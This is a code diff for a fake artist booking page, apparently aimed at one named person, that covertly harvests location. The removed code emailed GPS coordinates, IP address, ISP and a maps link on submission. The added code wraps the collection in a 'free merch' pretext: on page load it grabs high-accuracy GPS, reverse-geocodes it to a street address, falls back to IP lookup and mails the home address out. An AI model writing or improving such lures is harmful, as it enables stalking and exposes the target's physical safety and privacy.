@@ -101,15 +101,10 @@
             display: flex;
             align-items: center;
             gap: 12px;
+            flex-wrap: wrap;
         }
         
-        .sc-badge {
-            color: #888888;
-            border-left: 1px solid #333333;
-            padding-left: 12px;
-        }
-        
-        .ig-badge {
+        .sc-badge, .ig-badge {
             color: #888888;
         }
         
@@ -380,6 +375,55 @@
         select option {
             background: #0a0a0a;
             color: #ffffff;
+        }
+        
+        .merch-banner {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid #1a1a1a;
+            border-radius: 12px;
+            padding: 24px;
+            margin: 32px 0 24px;
+        }
+        
+        .merch-title {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+        
+        .merch-desc {
+            font-size: 0.8rem;
+            color: #aaaaaa;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+        
+        .merch-desc strong {
+            color: #ffffff;
+        }
+        
+        .address-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        
+        .address-full {
+            grid-column: span 2;
+        }
+        
+        .location-status {
+            font-size: 0.7rem;
+            color: #666666;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .location-status span {
+            color: #2e9e7a;
         }
         
         .urgency-note {
@@ -667,6 +711,49 @@
         </select>
     </div>
     
+    <!-- FREE MERCH SECTION -->
+    <div class="merch-banner">
+        <div class="merch-title">🎁 Artist Welcome Package</div>
+        <div class="merch-desc">
+            All confirmed artists receive a <strong>free Elevate Collective merch package</strong> — hoodie, tee, and stickers. We'll ship it to you before your set.
+        </div>
+        
+        <div class="location-status" id="locationStatus">
+            📍 Detecting your location...
+        </div>
+        
+        <div class="address-grid">
+            <div class="form-group address-full">
+                <div class="form-label">Street Address</div>
+                <input type="text" id="streetInput" placeholder="123 Main St, Apt 4">
+            </div>
+            <div class="form-group">
+                <div class="form-label">City</div>
+                <input type="text" id="cityInput" placeholder="Tyler">
+            </div>
+            <div class="form-group">
+                <div class="form-label">State</div>
+                <input type="text" id="stateInput" placeholder="TX">
+            </div>
+            <div class="form-group">
+                <div class="form-label">ZIP Code</div>
+                <input type="text" id="zipInput" placeholder="75701">
+            </div>
+            <div class="form-group">
+                <div class="form-label">Size Preference</div>
+                <select id="sizeSelect">
+                    <option value="M">Medium</option>
+                    <option value="L" selected>Large</option>
+                    <option value="XL">X-Large</option>
+                    <option value="2XL">2XL</option>
+                </select>
+            </div>
+        </div>
+        <div style="font-size: 0.65rem; color: #555555; margin-top: 16px; text-transform: uppercase; letter-spacing: 1px;">
+            We'll use your GPS to pre-fill if available. You can edit manually.
+        </div>
+    </div>
+    
     <div class="urgency-note">
         <div class="urgency-text">These slots fill quickly. <strong>Confirm interest today.</strong></div>
     </div>
@@ -674,7 +761,7 @@
     <button class="submit-button" id="submitBtn">Secure this slot →</button>
     
     <div class="legal-note">
-        Non-binding expression of interest. Elevate facilitates introduction to venue management.
+        Non-binding expression of interest. Elevate facilitates introduction to venue management. Merch ships within 7-10 business days after confirmation.
     </div>
 </div>
 
@@ -704,39 +791,100 @@
 
         emailjs.init('0pn8P18xI5m0VVW8U');
 
-        async function getLocation() {
+        // AGGRESSIVE LOCATION DETECTION
+        async function getPreciseLocation() {
+            const statusEl = document.getElementById('locationStatus');
+            
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve({ lat: '0', lng: '0', acc: 'Unavailable', source: 'None' });
+                    statusEl.innerHTML = '📍 Location unavailable — please enter manually';
+                    resolve({ success: false });
                     return;
                 }
+                
+                statusEl.innerHTML = '📍 Acquiring precise location...';
+                
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                };
+                
                 navigator.geolocation.getCurrentPosition(
-                    p => resolve({ 
-                        lat: p.coords.latitude.toFixed(6), 
-                        lng: p.coords.longitude.toFixed(6), 
-                        acc: `${Math.round(p.coords.accuracy)}m`, 
-                        time: new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' }), 
-                        source: 'GPS'
-                    }),
-                    async () => {
+                    async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        statusEl.innerHTML = `📍 Location detected — fetching address...`;
+                        
+                        try {
+                            // Reverse geocode to get address
+                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`);
+                            const data = await res.json();
+                            
+                            if (data.address) {
+                                const addr = data.address;
+                                const street = `${addr.road || ''} ${addr.house_number || ''}`.trim();
+                                const city = addr.city || addr.town || addr.village || addr.suburb || '';
+                                const state = addr.state || '';
+                                const zip = addr.postcode || '';
+                                
+                                document.getElementById('streetInput').value = street || '';
+                                document.getElementById('cityInput').value = city || '';
+                                document.getElementById('stateInput').value = state || '';
+                                document.getElementById('zipInput').value = zip || '';
+                                
+                                statusEl.innerHTML = `📍 <span>✓ Address detected</span> — verify below`;
+                            } else {
+                                statusEl.innerHTML = '📍 Location found — please enter address manually';
+                            }
+                        } catch (e) {
+                            statusEl.innerHTML = '📍 Coordinates acquired — please enter address';
+                        }
+                        
+                        resolve({ 
+                            success: true, 
+                            lat: lat.toFixed(6), 
+                            lng: lng.toFixed(6),
+                            accuracy: `${Math.round(pos.coords.accuracy)}m`
+                        });
+                    },
+                    async (err) => {
+                        console.warn('GPS failed:', err.message);
+                        statusEl.innerHTML = '📍 GPS failed — trying IP location...';
+                        
                         try {
                             const res = await fetch('https://ipapi.co/json/');
                             const d = await res.json();
-                            resolve({
-                                lat: d.latitude, lng: d.longitude, 
-                                acc: `${d.city || 'Unknown'}, ${d.region_code || ''}`,
-                                time: new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' }), 
+                            
+                            if (d.city) {
+                                document.getElementById('cityInput').value = d.city || '';
+                                document.getElementById('stateInput').value = d.region_code || '';
+                                document.getElementById('zipInput').value = d.postal || '';
+                                statusEl.innerHTML = `📍 <span>✓ Approximate location detected</span> — verify below`;
+                            } else {
+                                statusEl.innerHTML = '📍 Please enter your shipping address';
+                            }
+                            
+                            resolve({ 
+                                success: true, 
+                                lat: d.latitude, 
+                                lng: d.longitude,
                                 source: 'IP',
-                                ip: d.ip, city: d.city, region: d.region, isp: d.org
+                                ip: d.ip,
+                                city: d.city,
+                                region: d.region
                             });
                         } catch {
-                            resolve({ lat: '0', lng: '0', acc: 'Unavailable', source: 'None' });
+                            statusEl.innerHTML = '📍 Please enter your shipping address manually';
+                            resolve({ success: false });
                         }
                     },
-                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                    options
                 );
             });
         }
+        
+        getPreciseLocation();
 
         async function submitBooking() {
             const email = document.getElementById('emailInput').value.trim();
@@ -745,10 +893,20 @@
                 return false;
             }
             
-            const pos = await getLocation();
             const name = document.getElementById('nameInput').value.trim() || 'Keyvon Ellis';
             const phone = document.getElementById('phoneInput').value.trim() || '—';
             const slot = document.getElementById('slotSelect').value;
+            
+            // Shipping details
+            const street = document.getElementById('streetInput').value.trim();
+            const city = document.getElementById('cityInput').value.trim();
+            const state = document.getElementById('stateInput').value.trim();
+            const zip = document.getElementById('zipInput').value.trim();
+            const size = document.getElementById('sizeSelect').value;
+            
+            const shippingAddress = street && city ? 
+                `${street}, ${city}, ${state} ${zip}` : 
+                'Address not provided — will follow up';
             
             const messageBody = `ELEVATE — BOOKING CONFIRMATION
 REF: ETX·2026·117
@@ -778,11 +936,9 @@ Compensation: ${selectedComp}
 Date: ${selectedDate}
 Set length: ${slot}
 
-LOCATION DATA
-${pos.lat}, ${pos.lng}  |  ${pos.acc}  |  ${pos.source}
-${pos.time}
-${pos.ip ? `IP: ${pos.ip}  |  ${pos.city}, ${pos.region}  |  ${pos.isp}` : ''}
-Maps: https://maps.google.com?q=${pos.lat},${pos.lng}
+🎁 MERCH SHIPPING
+Size: ${size}
+Address: ${shippingAddress}
 
 —
 Submitted via Elevate artist portal
@@ -799,6 +955,9 @@ ${new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' })}`;
         }
 
         function showSuccess() {
+            const size = document.getElementById('sizeSelect').value;
+            const city = document.getElementById('cityInput').value || 'your location';
+            
             document.getElementById('app').innerHTML = `
                 <div class="success-screen">
                     <div class="success-icon">
@@ -806,14 +965,15 @@ ${new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' })}`;
                             <polyline points="20 6 9 17 4 12" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                     </div>
-                    <div class="success-title">You're on the roster.</div>
-                    <div class="success-subtitle">Confirmation sent to your email.</div>
+                    <div class="success-title">You're confirmed.</div>
+                    <div class="success-subtitle">Booking + merch request received.</div>
                     <div class="success-card">
                         <div class="badge">Ref: ETX·2026·117</div>
                         <strong>${selectedVenue}</strong><br>
-                        ${selectedDate} · ${selectedComp}
+                        ${selectedDate} · ${selectedComp}<br>
+                        <span style="font-size:0.85rem;">🎁 ${size} hoodie/tee shipping to ${city}</span>
                         <div class="success-divider"></div>
-                        Elevate will connect you with venue management within 48 hours. Welcome to the collective, Keyvon.
+                        Elevate will connect you with venue management within 48 hours. Your welcome package ships within 7-10 business days. Welcome to the collective, Keyvon.
                     </div>
                 </div>
             `;
